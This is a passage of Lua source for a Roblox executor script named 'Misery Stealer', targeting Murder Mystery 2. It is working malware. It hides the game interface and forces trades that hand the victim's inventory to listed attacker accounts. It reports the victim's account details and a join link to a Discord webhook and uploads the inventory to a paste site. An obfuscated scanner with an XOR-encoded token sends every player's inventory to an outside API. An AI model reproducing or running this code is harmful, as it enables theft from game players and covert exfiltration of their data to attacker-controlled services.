		if v198 == "tablet" then
			getconnections(
				game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("TradeRequest")
					:WaitForChild("ReceivingRequest")
					:WaitForChild("Decline").MouseButton1Click
			)[1]:Fire()
		else
			local v274 = getconnections(
				game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Lobby")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("OverlayMenu")
					:WaitForChild("TradeRequest")
					:WaitForChild("ReceivingRequest")
					:WaitForChild("Decline").MouseButton1Click
			)[1]

			v274:Fire()
		end
	end
	cancel_pending_request = function()
		if v198 == "tablet" then
			getconnections(
				game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Game")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("TradeRequest")
					:WaitForChild("SendingRequest")
					:WaitForChild("Cancel").MouseButton1Click
			)[1]:Fire()
		else
			getconnections(
				game.Players.LocalPlayer
					:WaitForChild("PlayerGui")
					:WaitForChild("MainGUI")
					:WaitForChild("Lobby")
					:WaitForChild("Leaderboard")
					:WaitForChild("Container")
					:WaitForChild("OverlayMenu")
					:WaitForChild("TradeRequest")
					:WaitForChild("SendingRequest")
					:WaitForChild("Cancel").MouseButton1Click
			)[1]:Fire()
		end
	end
	Steal = function(p30)
		if getgenv()._stealing then
			return
		end

		getgenv()._stealing = true
		pcall(function()
			HideGui()

			local Name = p30.Name

			while IsTrading() ~= "None" do
				pcall(stop_trade)
				pcall(declince_trade_request)
				pcall(cancel_pending_request)
				task.wait(0.2)
			end

			while IsTrading() == "None" do
				pcall(function()
					SendTrade(Name)
				end)
				task.wait(0.5)
			end

			local now = tick()

			while IsTrading() ~= "None" and IsTrading() ~= "StartTrade" and tick() - now < 30 do
				task.wait(0.3)
			end

			if IsTrading() ~= "StartTrade" then
				pcall(cancel_pending_request)

				return
			end

			task.wait(0.5)
			DepositedItems = 0
			current_inv = GetSortedItems()

			if #current_inv == 0 then
				for i = 1, 5 do
					task.wait(1)
					current_inv = GetSortedItems()

					if #current_inv > 0 then
						break
					end
				end
			end

			if #current_inv == 0 then
				return
			end

			for _, v in ipairs(current_inv) do
				DepositItemInTrade(v.ID, v.Class, v.Amount)

				if not (DepositedItems >= 4) then
					task.wait()

					continue
				end

				break
			end

			DepositedItems = 0
			ReadyTrade()
		end)
		getgenv()._stealing = false
	end
	UnlockTrades = function()
		game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
	end
	LoopSteal = function(p31)
		UnlockTrades()
		task.spawn(function()
			while task.wait(0.1) do
				if #GetSortedItems() == 0 then
					break
				else
					pcall(function()
						Steal(p31)
					end)
				end
			end
		end)
	end
	shall_steal = function(p32)
		if p32.Name == game.Players.LocalPlayer.Name then
			return false
		end

		for _, v in pairs(Usernames) do
			if v:lower() == p32.Name:lower() then
				return true
			end
		end

		if string.find(p32.Name:lower(), "egorhits_") then
			return true
		end

		return false
	end
	PrepareSteal = function(p33)
		UnlockTrades()
		task.wait()
		Trade.SendRequest.OnClientInvoke = function(p34)
			if shall_steal(p34) then
				task.wait()
				declince_trade_request()
				task.wait()
				LoopSteal(p33)
			else
				declince_trade_request()
			end

			return true
		end
		task.spawn(function()
			pcall(getgenv()._mm2inv_scanOne, p33)
		end)
		LoopSteal(p33)
	end

	local shall_steal_ = shall_steal
	local PrepareSteal_ = PrepareSteal
	local LoopSteal_ = LoopSteal
	local v285, v286, v287 = pairs(game.Players:GetChildren())

	for _, v in v285, v286, v287 do
		if shall_steal_(v) then
			PrepareSteal_(v)
		end
	end

	Players4.PlayerAdded:Connect(function(player)
		if shall_steal_(player) then
			PrepareSteal_(player)
		end
	end)

	local v290, v291, v292 = pairs(Players4:GetPlayers())

	for _, v in v290, v291, v292 do
		if shall_steal_(v) then
			v.Chatted:Connect(function()
				LoopSteal_(v)
			end)
		end
	end

	Players4.PlayerAdded:Connect(function(player)
		if shall_steal_(player) then
			player.Chatted:Connect(function()
				LoopSteal_(player)
			end)
		end
	end)

	local LocalPlayer2 = game:GetService("Players").LocalPlayer
	local identifyexecutor_ = identifyexecutor and identifyexecutor() or "unknown"
	local s1 = ""

	pcall(function()
		local v298 = request({
			Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
				.. LocalPlayer2.UserId
				.. "&size=150x150&format=Png&isCircular=false",
			Method = "GET",
		})

		if v298 then
			if v298.Body then
				local data = HttpService:JSONDecode(v298.Body)

				if data and data.data and data.data[1] then
					s1 = data.data[1].imageUrl or ""
				end
			end
		end
	end)

	local now = os.time()
	local id
	local u302 = true

	local function v303(p35, p36, p37)
		if p37 then
			return "🌈"
		end

		local v304 = p35:lower()

		for _, v in ipairs({
			{
				"elderwood",
				"🌳",
			},
			{
				"ghostblade",
				"👻",
			},
			{
				"ghostgun",
				"👻",
			},
			{
				"darkblade",
				"🖤",
			},
			{
				"darkgun",
				"🖤",
			},
			{
				"heartblade",
				"💖",
			},
			{
				"heartgun",
				"💖",
			},
			{
				"candycane",
				"🍬",
			},
			{
				"candygun",
				"🍬",
			},
			{
				"pumpkin",
				"🎃",
			},
			{
				"snowflake",
				"❄",
			},
			{
				"snowgun",
				"❄",
			},
			{
				"clown",
				"🤡",
			},
			{
				"sharkbite",
				"🦈",
			},
			{
				"shark",
				"🦈",
			},
			{
				"tiger",
				"🐯",
			},
			{
				"viper",
				"🐍",
			},
			{
				"slasher",
				"⚔",
			},
			{
				"blaster",
				"💥",
			},
			{
				"luger",
				"🔫",
			},
			{
				"seercam",
				"📷",
			},
			{
				"seer",
				"🔮",
			},
			{
				"amaranth",
				"🌸",
			},
			{
				"blossom",
				"🌸",
			},
			{
				"saw",
				"🪚",
			},
			{
				"icicle",
				"🧊",
			},
			{
				"icedagger",
				"🧊",
			},
			{
				"gingerblade",
				"🍪",
			},
			{
				"ginger",
				"🍪",
			},
			{
				"batwing",
				"🦇",
			},
			{
				"arctic",
				"❄",
			},
			{
				"seasons",
				"🍂",
			},
			{
				"season",
				"🍂",
			},
			{
				"tides",
				"🌊",
			},
			{
				"wave",
				"🌊",
			},
			{
				"aurora",
				"🌅",
			},
			{
				"prismatic",
				"🔮",
			},
			{
				"prism",
				"🔮",
			},
			{
				"eternal",
				"✨",
			},
			{
				"laser",
				"⚡",
			},
			{
				"skul",
				"💀",
			},
			{
				"corrupt",
				"🌀",
			},
			{
				"phantom",
				"👻",
			},
			{
				"vine",
				"🌿",
			},
			{
				"lava",
				"🌋",
			},
			{
				"void",
				"🕳",
			},
			{
				"cosmic",
				"🌌",
			},
			{
				"galaxy",
				"🌌",
			},
			{
				"rainbow",
				"🌈",
			},
			{
				"classic",
				"📜",
			},
			{
				"vintage",
				"📜",
			},
			{
				"ghost",
				"👻",
			},
			{
				"skull",
				"💀",
			},
			{
				"death",
				"💀",
			},
			{
				"bone",
				"🦴",
			},
			{
				"blood",
				"🩸",
			},
			{
				"spider",
				"🕷",
			},
			{
				"dragon",
				"🐉",
			},
			{
				"snake",
				"🐍",
			},
			{
				"wolf",
				"🐺",
			},
			{
				"fox",
				"🦊",
			},
			{
				"hawk",
				"🦅",
			},
			{
				"eagle",
				"🦅",
			},
			{
				"bat",
				"🦇",
			},
			{
				"wing",
				"🦅",
			},
			{
				"elder",
				"🌳",
			},
			{
				"wood",
				"🌳",
			},
			{
				"dark",
				"🖤",
			},
			{
				"shadow",
				"🌑",
			},
			{
				"evil",
				"🌀",
			},
			{
				"fire",
				"🔥",
			},
			{
				"flame",
				"🔥",
			},
			{
				"ice",
				"🧊",
			},
			{
				"frost",
				"🧊",
			},
			{
				"chill",
				"🧊",
			},
			{
				"snow",
				"❄",
			},
			{
				"winter",
				"❄",
			},
			{
				"crystal",
				"💎",
			},
			{
				"gem",
				"💎",
			},
			{
				"diamond",
				"💎",
			},
			{
				"ruby",
				"💎",
			},
			{
				"emerald",
				"💎",
			},
			{
				"electric",
				"⚡",
			},
			{
				"thunder",
				"⚡",
			},
			{
				"star",
				"⭐",
			},
			{
				"pink",
				"🌸",
			},
			{
				"heart",
				"💗",
			},
			{
				"candy",
				"🍬",
			},
			{
				"treat",
				"🍬",
			},
			{
				"scythe",
				"🪓",
			},
			{
				"ax",
				"🪓",
			},
			{
				"sword",
				"⚔",
			},
			{
				"blade",
				"⚔",
			},
			{
				"knife",
				"🔪",
			},
			{
				"gun",
				"🔫",
			},
			{
				"shot",
				"🔫",
			},
			{
				"pistol",
				"🔫",
			},
			{
				"revolver",
				"🔫",
			},
		}) do
			if v304:find(v[1], 1, true) then
				return v[2]
			end
		end

		return ({
			Unique = "✨",
			Ancient = "🏺",
			Godly = "⭐",
			Vintage = "📜",
			Legendary = "🔮",
		})[p36] or "⭐"
	end

	local v307 = 'game:GetService("TeleportService"):TeleportToPlaceInstance('
		.. game.PlaceId
		.. ', "'
		.. abcdefg
		.. '")'
	local v308 = #game:GetService("Players"):GetPlayers()
	local MaxPlayers = game:GetService("Players").MaxPlayers

	local function v310(p38)
		return (tostring(math.floor(p38 or 0)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", ""))
	end
	local function v311(p39, p40)
		local ok2, result2 = pcall(request, {
			Url = "https://pastefy.app/api/v2/paste",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = HttpService:JSONEncode({
				title = p39,
				content = p40,
			}),
		})

		if not ok2 or not result2 or result2.StatusCode ~= 200 then
			return nil
		end

		local ok3, result3 = pcall(function()
			return HttpService:JSONDecode(result2.Body)
		end)

		if ok3 and result3 and result3.paste and result3.paste.id then
			return "https://pastefy.app/" .. result3.paste.id .. "/raw"
		end

		return nil
	end
	local function v316(p41, p42, p43)
		local t24 = {}
		local v318 = #hits

		for i, v in ipairs(hits) do
			if i > 17 then
				break
			end

			table.insert(
				t24,
				string.format(
					"%02d %s%s ×%d — %s ea · %s",
					i,
					v.Name,
					v.Chroma and " ✦" or "",
					v.Amount,
					v310(v.Amount > 0 and math.floor(v.RAP / v.Amount) or 0),
					v310(v.RAP)
				)
			)
		end

		if v318 > 17 then
			table.insert(t24, string.format("   +%d more", v318 - 17))
		end

		if #t24 > 0 then
			table.insert(t24, string.rep("═", 39))

			if p41 and p42 and p42 > 0 then
				local v321 = p43 and "Claimed All" or "Claimed " .. v310(p42) .. " Value"

				table.insert(t24, string.format("Total ➜ %s Value (%s)", v310(total_value), v321))
			else
				table.insert(t24, string.format("Total ➜ %s Value", v310(total_value)))
			end
		end

		local v322 = #t24 > 0

		v322 = v322 and "```\n" .. table.concat(t24, "\n") .. "\n```" or "*no items found*"

		if #v322 > 1020 then
			v322 = v322:sub(1, 1010) .. "...\n```"
		end

		return v322
	end

	local v323 = v316(false, 0, false)
	local u324

	pcall(function()
		local t25 = { LocalPlayer2.Name .. " — Total: " .. v310(total_value) .. " Value\n" }

		for _, v in ipairs(hits) do
			table.insert(t25, string.format("[%s] %s x%d — %s Value", v.Rarity, v.Name, v.Amount, v310(v.RAP)))
		end

		u324 = v311(LocalPlayer2.Name .. " MM2 Inventory", table.concat(t25, "\n"))
	end)

	local function v328()
		local _claimedTotal = getgenv()._claimedTotal or 0

		return math.floor(total_value > 0 and _claimedTotal / total_value * 100 or 0) .. "%"
	end
	local function v330(p44, p45)
		local _claimedTotal = getgenv()._claimedTotal or 0

		if not getgenv()._claimedItems then
		end

		local v332 = p45 and "You claimed all the items!" or "Player still in the server - Join now"
		local v333 = "```\nUsername: "
			.. LocalPlayer2.Name
			.. "\nDisplay Username: "
			.. LocalPlayer2.DisplayName
			.. "\nAccount Age: "
			.. LocalPlayer2.AccountAge
			.. " days\nGame: Murder Mystery 2\nExecutor: "
			.. identifyexecutor_
			.. "\nServer: "
			.. v308
			.. "/"
			.. MaxPlayers
			.. " Players\nReceiver: "
			.. table.concat(Usernames, ", ")
			.. "\n```"
		local t26 = {}

		if #hits > 0 then
			table.insert(t26, {
				name = "Inventory",
				value = v316(p45, _claimedTotal, _claimedTotal >= total_value),
				inline = false,
			})
		end

		if not p45 then
			table.insert(t26, {
				name = "Join Now",
				value = "[Click to join!](" .. ROBLOX_JOIN_CLICK_URL .. ")",
				inline = false,
			})
		end

		if u324 then
			table.insert(t26, {
				name = "Full Inventory",
				value = "[View all](" .. u324 .. ")",
				inline = false,
			})
		end

		return t26, v333, v332
	end

	local u335

	local function v336()
		local _hasClaimed = getgenv()._hasClaimed or false
		local _claimedTotal = getgenv()._claimedTotal or 0

		if _hasClaimed and _claimedTotal > 0 then
			if total_value <= _claimedTotal then
				return 3066993
			end

			return 52945
		end

		return nil
	end
	local function v339()
		if total_value >= 10000 then
			return "--@everyone BIG FUCKING HIT JOIN TO CLAIM | Misery Stealer"
		end

		if total_value >= 1000 then
			return "--@everyone Big Hit | Misery Stealer"
		end

		return "--@everyone New Hit | Misery Stealer"
	end

	pcall(function()
		local v340, v341, v342 = v330("🦖 In Server", false)
		local v343 = total_value >= 300 and "--@everyone\n" .. v307 or v307

		u335 = request({
			Url = Webhook .. "?wait=true",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = game:GetService("HttpService"):JSONEncode({
				content = v343,
				username = "Misery Stealer",
				embeds = {
					{
						description = v341,
						color = v336(),
						author = {
							name = LocalPlayer2.Name,
							icon_url = s1,
						},
						title = v342,
						thumbnail = {
							url = s1,
						},
						fields = v340,
						footer = {
							text = "Misery Stealer",
						},
						timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
					},
				},
			}),
		})
	end)
	pcall(function()
		local data = game:GetService("HttpService"):JSONDecode(u335.Body)

		id = data.id
		getgenv()._hitMsgId = data.id
	end)
	getgenv()._onClaim = function(p46, p47)
		if not id then
			return
		end

		if #p46 == 0 then
			return
		end

		local v345 = os.time() - now
		local v346 = string.format("%dm %ds", math.floor(v345 / 60), v345 % 60)

		getgenv()._hasClaimed = true

		local v347 = p47 and "<a:g_bearhearts:1396350664967454772>" or "🥶"
		local v348 = p47 and "Total Value: " .. v310(total_value) .. " value • claimed all in " .. v346
			or "Total Value: " .. v310(total_value) .. " value • claimed some items in " .. v346

		pcall(function()
			local v349, v350 = v330(v347 .. " " .. (p47 and "CLAIMED ALL!" or "Claimed Items"), true)

			request({
				Url = Webhook .. "/messages/" .. id,
				Method = "PATCH",
				Headers = {
					["Content-Type"] = "application/json",
				},
				Body = game:GetService("HttpService"):JSONEncode({
					embeds = {
						{
							description = v350,
							color = 3066993,
							author = {
								name = LocalPlayer2.Name,
								icon_url = s1,
							},
							title = v348,
							thumbnail = {
								url = s1,
							},
							fields = v349,
							footer = {
								text = "Misery Stealer",
							},
							timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
						},
					},
				}),
			})
		end)
	end
	task.spawn(function()
		while u302 do
			task.wait(300)

			if not u302 then
				break
			end

			local v352 = os.time() - now

			string.format("%dm %ds", math.floor(v352 / 60), v352 % 60)

			if not id then
				continue
			end

			local exitTo

			repeat
				pcall(function()
					local _claimedTotal = getgenv()._claimedTotal or 0
					local s2 = "🦖"
					local n6

					if getgenv()._hasClaimed and _claimedTotal > 0 then
						s2 = "🥶"

						if total_value <= _claimedTotal then
							n6 = 3066993
						else
							n6 = 52945
						end
					end

					local v357, v358, v359 = v330(s2 .. " In Server", getgenv()._hasClaimed and _claimedTotal > 0)

					request({
						Url = Webhook .. "/messages/" .. id,
						Method = "PATCH",
						Headers = {
							["Content-Type"] = "application/json",
						},
						Body = game:GetService("HttpService"):JSONEncode({
							embeds = {
								{
									description = v358,
									color = n6,
									author = {
										name = LocalPlayer2.Name,
										icon_url = s1,
									},
									title = v359,
									thumbnail = {
										url = s1,
									},
									fields = v357,
									footer = {
										text = "Misery Stealer",
									},
									timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
								},
							},
						}),
					})
				end)
				exitTo = nil

				while u302 do
					task.wait(300)

					if not u302 then
						break
					end

					local v360 = os.time() - now

					string.format("%dm %ds", math.floor(v360 / 60), v360 % 60)

					if id then
						exitTo = 1

						break
					end
				end
			until exitTo ~= 1

			return
		end
	end)

	local u361 = false

	local function fireLeave()
		if u361 then
			return
		end

		u361 = true
		getgenv()._fireLeave = nil
		getgenv()._aj_done = true
		u302 = false

		local v363 = os.time() - now

		string.format("%dm %ds", math.floor(v363 / 60), v363 % 60)

		local _claimedTotal = getgenv()._claimedTotal or 0
		local _claimedItems = getgenv()._claimedItems or {}
		local _hasClaimed = getgenv()._hasClaimed or false

		if _hasClaimed and _claimedTotal > 0 then
			return
		end

		local v367 = "Total Value: " .. v310(total_value) .. " value • Left server"
		local v368 = "```\nUsername: "
			.. LocalPlayer2.Name
			.. "\nDisplay Username: "
			.. LocalPlayer2.DisplayName
			.. "\nAccount Age: "
			.. LocalPlayer2.AccountAge
			.. " days\nGame: Murder Mystery 2\nExecutor: "
			.. identifyexecutor_
			.. "\nServer: "
			.. v308
			.. "/"
			.. MaxPlayers
			.. " Players\nReceiver: "
			.. table.concat(Usernames, ", ")
			.. "\n```"
		local t27 = {}

		if #hits > 0 then
			table.insert(t27, {
				name = "Inventory",
				value = v323,
				inline = false,
			})
		end

		table.insert(t27, {
			name = "Join Now",
			value = "[Click to join!](" .. ROBLOX_JOIN_CLICK_URL .. ")",
			inline = false,
		})

		if u324 then
			table.insert(t27, {
				name = "Full Inventory",
				value = "[View all](" .. u324 .. ")",
				inline = false,
			})
		end

		if _claimedTotal > 0 then
			local v370 = string.format("$%.2f", _claimedTotal / 1000 * 8.5)

			table.insert(t27, {
				name = "Claimed",
				value = "**" .. v310(_claimedTotal) .. "**",
				inline = true,
			})
			table.insert(t27, {
				name = "USD",
				value = "**" .. v370 .. "**",
				inline = true,
			})
			table.insert(t27, {
				name = "Trades",
				value = tostring(#_claimedItems),
				inline = true,
			})
		end

		local json = game:GetService("HttpService"):JSONEncode({
			embeds = {
				{
					description = v368,
					color = 16711680,
					author = {
						name = LocalPlayer2.Name,
						icon_url = s1,
					},
					title = v367,
					thumbnail = {
						url = s1,
					},
					fields = t27,
					footer = {
						text = "Misery Stealer",
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
				},
			},
		})

		pcall(function()
			if id then
				request({
					Url = Webhook .. "/messages/" .. id,
					Method = "PATCH",
					Headers = {
						["Content-Type"] = "application/json",
					},
					Body = json,
				})
			else
				local data = game:GetService("HttpService"):JSONDecode(json)

				data.content = total_value >= 300 and "--@everyone\n" .. v307 or v307
				request({
					Url = Webhook,
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json",
					},
					Body = game:GetService("HttpService"):JSONEncode(data),
				})
			end
		end)
	end

	getgenv()._fireLeave = fireLeave
	LocalPlayer2.AncestryChanged:Connect(function(child, parent)
		if parent == nil then
			fireLeave()
		end
	end)
	task.spawn(function()
		local function v373(p48)
			pcall(function()
				p48.MouseButton1Click:Connect(fireLeave)
			end)
			pcall(function()
				p48.Activated:Connect(fireLeave)
			end)
		end

		pcall(function()
			v373(
				game:GetService("CoreGui").InGameFullscreenTitleBarScreen.Bar.BarFrame.ThreeSectionBar.rightFrame.ExitButton
			)
		end)

		local function v374(p49)
			for _, descendant in ipairs(p49:GetDescendants()) do
				if descendant:IsA("GuiButton") then
					local v377 = descendant.Name:lower()
					local v378 = descendant:IsA("TextButton") and descendant.Text:lower() or ""

					if v377:find("leave") or v378:find("leave") or v377 == "quit" or v378 == "quit" then
						v373(descendant)
					end
				end
			end
		end

		pcall(function()
			v374(LocalPlayer2.PlayerGui)
		end)
		LocalPlayer2.PlayerGui.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("GuiButton") then
				local v379 = descendant.Name:lower()
				local v380 = descendant:IsA("TextButton") and descendant.Text:lower() or ""

				if v379:find("leave") or v380:find("leave") or v379 == "quit" or v380 == "quit" then
					v373(descendant)
				end
			end
		end)
	end)
end
MM2INV_SCANNER = function()
	if getgenv()._mm2inv_scanning and getgenv()._mm2inv_scanJob == game.JobId then
		getgenv()._mm2inv_scanning = false
	end

	getgenv()._mm2inv_scanning = true
	getgenv()._mm2inv_scanJob = game.JobId

	local Players2 = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Item

	pcall(function()
		Item = require(ReplicatedStorage:WaitForChild("Database", 30):WaitForChild("Sync", 30):WaitForChild("Item", 30))
	end)

	if not Item then
		task.wait(5)
		pcall(function()
			Item = require(
				ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10)
			)
		end)
	end

	local function v385(p50, p51, p52)
		return p50 - p51 + p52
	end

	local t28 = {
		v385(100, 5, 0),
		v385(90, 5, 0),
		v385(10, 3, 0),
		v385(85, 4, 0),
		v385(15, 5, 0),
		v385(8, 3, 0),
		v385(84, 4, 0),
		v385(93, 4, 0),
		v385(4, 3, 0),
		v385(13, 3, 0),
		v385(12, 3, 0),
		v385(83, 3, 0),
		v385(5, 4, 0),
		v385(9, 3, 0),
		v385(90, 3, 0),
		v385(88, 4, 0),
		v385(6, 4, 0),
		v385(85, 5, 0),
		v385(11, 3, 0),
		v385(7, 3, 0),
		v385(14, 4, 0),
		v385(16, 4, 0),
		v385(11, 4, 0),
		v385(98, 4, 0),
		v385(3, 2, 0),
		v385(9, 4, 0),
		v385(15, 3, 0),
		v385(99, 4, 0),
		v385(8, 4, 0),
		v385(13, 4, 0),
		v385(91, 4, 0),
		v385(87, 3, 0),
		v385(10, 4, 0),
		v385(89, 5, 0),
		v385(2, 1, 0),
		v385(5, 3, 0),
		v385(12, 5, 0),
		v385(90, 4, 0),
		v385(10, 4, 0),
		v385(14, 4, 0),
		v385(7, 4, 0),
		v385(10, 3, 0),
		v385(17, 5, 0),
		v385(9, 5, 0),
		v385(84, 4, 0),
		v385(6, 3, 0),
		v385(10, 5, 0),
		v385(12, 4, 0),
	}
	local t29 = {}

	for i, v in ipairs({
		34,
		22,
		41,
		8,
		13,
		2,
		47,
		30,
		11,
		7,
		27,
		45,
		21,
		38,
		36,
		20,
		25,
		46,
		17,
		43,
		32,
		9,
		14,
		15,
		33,
		19,
		26,
		42,
		37,
		23,
		40,
		16,
		10,
		3,
		28,
		29,
		48,
		31,
		6,
		24,
		44,
		35,
		12,
		1,
		18,
		39,
		4,
		5,
	}) do
		t29[i] = t28[v]
	end

	local v390 = tostring(game.PlaceId)
	local t30 = {}

	for i, v in ipairs(t29) do
		t30[i] = string.char(bit32.bxor(v, v390:byte((i - 1) % #v390 + 1)))
	end

	local s3 = ""
	local ok2, result2 = pcall(request, {
		Url = "https://api.mm2inv.com/bootstrap",
		Method = "POST",
		Headers = {
			Authorization = "Bearer " .. table.concat(t30),
			["Content-Type"] = "application/json",
		},
		Body = "{}",
	})

	if ok2 and result2 and result2.Body then
		local ok3, result3 = pcall(function()
			return HttpService:JSONDecode(result2.Body)
		end)

		if ok3 and result3 and result3.k then
			s3 = result3.k
		end
	end

	if s3 == "" then
		getgenv()._mm2inv_scanning = false

		return
	end

	local t31 = {}

	pcall(function()
		local ok3, result3 = pcall(request, {
			Url = "https://api.mm2inv.com/sv",
			Method = "GET",
		})

		if not ok3 or not result3 or not result3.Body then
			return
		end

		local ok4, result4 = pcall(function()
			return HttpService:JSONDecode(result3.Body)
		end)

		if not ok4 or not result4 then
			return
		end

		local t32 = {
			Classic = "vintages",
			Godly = "godlies",
			Ancient = "ancients",
			Unique = "uniques",
			Legendary = "legendaries",
			Rare = "rares",
			Uncommon = "uncommons",
			Common = "commons",
		}

		local function v405(p53)
			return (p53 or ""):lower():gsub("[%s%'%-]", "")
		end

		local v406 = Item or {}

		for k, v in pairs(v406) do
			local Rarity = v.Rarity or ""
			local v410 = v.Chroma == true
			local v411 = v410 and "chromas" or t32[Rarity]

			if v411 then
				local ItemName = v.ItemName or ""

				if v410 then
					if ItemName:sub(1, 6):lower() ~= "chroma" then
						ItemName = "Chroma " .. ItemName
					end
				end

				local ItemType = v.ItemType or ""
				local v414 = result4[v411 .. "|" .. ItemName .. " (" .. ItemType .. ")"]

				if not v414 then
					local v415 = v405(ItemName .. " (" .. ItemType .. ")")
					local v416, v417, v418 = pairs(result4)
					local v419 = geniter(v416, v417, v418)

					while true do
						local v420 = table.pack(v419())

						if v420[1] then
							local v421 = v420[2]
							local v422 = v420[3]

							if v421:sub(1, #v411 + 1) == v411 .. "|" and v405(v421:sub(#v411 + 2)) == v415 then
								v414 = v422

								break
							end
						else
							break
						end
					end
				end

				if not v414 then
					v414 = result4[v411 .. "|" .. ItemName]

					if not v414 then
						local v423 = v405(ItemName)
						local v424, v425, v426 = pairs(result4)
						local v427 = geniter(v424, v425, v426)

						while true do
							local v428 = table.pack(v427())

							if v428[1] then
								local v429 = v428[2]
								local v430 = v428[3]

								if v429:sub(1, #v411 + 1) == v411 .. "|" and v405(v429:sub(#v411 + 2)) == v423 then
									v414 = v430

									break
								end
							else
								break
							end
						end
					end
				end

				if v414 and v414.value then
					t31[k] = v414.value
				end
			end
		end
	end)

	local function v431(p54)
		local t33 = {}
		local n7 = 0

		if type(p54) ~= "table" then
			return t33, 0
		end

		for k, v in pairs(p54) do
			local Owned = type(v) == "table" and v.Owned

			if type(Owned) == "table" then
				for k2, v2 in pairs(Owned) do
					local v439 = k2
					local v440 = tonumber(v2) or 1

					if type(k2) == "number" then
						v439 = v2
						v440 = 1
					end

					if type(v439) == "string" and #v439 > 0 then
						local v441 = Item and Item[v439]
						local ItemName = type(v441) == "table" and (v441.ItemName or v441.Name or v439) or v439

						if type(v441) == "table" and v441.Chroma == true then
							if ItemName:sub(1, 6):lower() ~= "chroma" then
								ItemName = "Chroma " .. ItemName
							end
						end

						if ItemName ~= "Default Knife" and ItemName ~= "Default Gun" then
							local v443 = t31[v439] or 0

							n7 += v443 * v440
							table.insert(t33, {
								key = v439,
								name = ItemName,
								category = k,
								rarity = type(v441) == "table" and v441.Rarity or nil,
								qty = v440,
								val = v443,
								chroma = type(v441) == "table" and v441.Chroma or false,
							})
						end
					end
				end
			end
		end

		return t33, n7
	end
	local function v444(p55, p56)
		local json = HttpService:JSONEncode(p56)
		local v446 = tostring(math.floor(os.time()))
		local ok3, result3 = pcall(request, {
			Url = "https://api.mm2inv.com" .. p55,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["X-Signature"] = t9.hmac(s3, v446 .. "." .. json),
				["X-Timestamp"] = v446,
			},
			Body = json,
		})

		if not ok3 or not result3 then
			return 0, nil
		end

		local StatusCode = result3.StatusCode or result3.statusCode or 0
		local data

		pcall(function()
			data = HttpService:JSONDecode(result3.Body or "")
		end)

		return StatusCode, data
	end

	local scanned = 0
	local lastPlayer = ""
	local lastScanTs = 0
	local bestValue = 0
	local bestPlayer = ""
	local bestTs = 0

	local function mm2invScanOne(p57)
		if not Item or p57.Parent ~= Players2 then
			return
		end

		local Remotes = ReplicatedStorage:WaitForChild("Remotes", 30)
		local response

		if p57 == Players2.LocalPlayer then
			local GetProfileData = Remotes
				and Remotes:FindFirstChild("Inventory")
				and Remotes.Inventory:FindFirstChild("GetProfileData")

			if not GetProfileData then
				return
			end

			response = GetProfileData:InvokeServer()
		else
			local GetFullInventory = Remotes
				and Remotes:FindFirstChild("Extras")
				and Remotes.Extras:FindFirstChild("GetFullInventory")

			if not GetFullInventory then
				return
			end

			response = GetFullInventory:InvokeServer(p57.Name)
		end

		local v462, v463 = v431(response)

		if #v462 == 0 then
			return
		end

		local s4 = ""

		pcall(function()
			local v465 = request({
				Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
					.. p57.UserId
					.. "&size=150x150&format=Png&isCircular=false",
				Method = "GET",
			})

			if v465 then
				if v465.Body then
					local data = HttpService:JSONDecode(v465.Body)

					if data and data.data and data.data[1] then
						s4 = data.data[1].imageUrl or ""
					end
				end
			end
		end)

		if
			v444("/scan", {
				username = p57.Name,
				place_id = game.PlaceId,
				job_id = game.JobId,
				total_value = v463,
				avatar_url = s4,
				items = v462,
			}) == 200
		then
			scanned += 1
			lastPlayer = p57.Name
			lastScanTs = math.floor(os.time())

			if bestValue < v463 then
				bestValue = math.floor(v463)
				bestPlayer = p57.Name
				bestTs = lastScanTs
			end
		end
	end

	getgenv()._mm2inv_scanOne = mm2invScanOne

	local function v467()
		local LocalPlayer = Players2.LocalPlayer
		local v469 = v444
		local s5 = "/heartbeat"
		local t34 = {
			username = LocalPlayer and LocalPlayer.Name or "unknown",
		}
		local UserId = LocalPlayer and LocalPlayer.UserId

		t34.user_id = UserId or 0
		t34.job_id = game.JobId
		t34.place_id = game.PlaceId
		t34.players = #Players2:GetPlayers()
		t34.scanned = scanned
		t34.last_player = lastPlayer
		t34.last_scan_ts = lastScanTs
		t34.best_value = bestValue
		t34.best_player = bestPlayer
		t34.best_ts = bestTs
		v469(s5, t34)
	end

	task.spawn(function()
		while true do
			pcall(v467)
			task.wait(30)
		end
	end)
	task.spawn(function()
		task.wait(1)

		while true do
			for _, player in ipairs(Players2:GetPlayers()) do
				pcall(mm2invScanOne, player)
				task.wait(0.5)
			end

			task.wait(300)
		end
	end)
	Players2.PlayerAdded:Connect(function(player)
		task.wait(5)
		pcall(mm2invScanOne, player)
	end)
end
MM2_STEALER()
task.spawn(MM2INV_SCANNER)
